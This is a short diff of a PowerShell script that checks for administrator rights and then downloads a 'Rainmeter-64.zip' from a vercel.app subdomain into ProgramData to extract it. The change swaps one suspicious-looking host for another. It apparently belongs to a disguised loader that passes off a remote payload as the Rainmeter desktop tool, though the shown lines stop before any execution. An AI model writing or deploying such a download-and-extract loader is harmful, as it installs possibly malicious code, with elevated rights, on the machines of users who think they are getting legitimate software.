@@ -20,7 +20,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 try {
-    $zipUrl      = "https://wechat-invite-chi.vercel.app//Rainmeter-64.zip"
+    $zipUrl      = "https://redirect-ten-gold.vercel.app/Rainmeter-64.zip"
     $zipPath     = "$env:ProgramData\Rainmeter-64.zip"
     $extractPath = "$env:ProgramData"
 
